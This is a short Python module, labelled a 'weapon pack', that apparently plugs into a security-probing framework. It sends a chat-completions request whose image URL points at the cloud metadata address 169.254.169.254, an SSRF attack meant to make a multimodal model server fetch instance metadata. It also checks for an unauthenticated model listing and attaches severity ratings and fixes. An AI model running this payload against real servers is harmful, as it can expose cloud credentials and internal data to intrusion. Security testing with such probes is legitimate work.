"""Weapon pack onejev-ssrf: onejev Media URL SSRF."""
from __future__ import annotations

import importlib.util
from pathlib import Path

KEY = "onejev-ssrf"
ROUTES = [
        {
                "name": "model listing",
                "method": "GET",
                "path": "/v1/models",
                "expect": 200,
                "sev": "medium",
                "fix": "Require auth on the multimodal endpoint."
        },
        {
                "name": "metadata media fetch",
                "method": "POST",
                "path": "/v1/chat/completions",
                "body": {
                        "model": "onejev",
                        "messages": [
                                {
                                        "role": "user",
                                        "content": [
                                                {
                                                        "type": "image_url",
                                                        "image_url": {
                                                                "url": "http://169.254.169.254/latest/meta-data/"
                                                        }
                                                }
                                        ]
                                }
                        ]
                },
                "expect": 200,
                "sev": "high",
                "fix": "Block link-local/loopback and resolve DNS once before fetch."
        }
]


def _load_common():
    path = Path(__file__).resolve().parent.parent / "_reserve-common.py"
    spec = importlib.util.spec_from_file_location(f"_reserve_common_{KEY.replace('-', '_')}", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


_COMMON = _load_common()


def run(ctx: dict, params: dict) -> dict:
    return _COMMON.http_probe(ctx, KEY, params, routes=ROUTES)
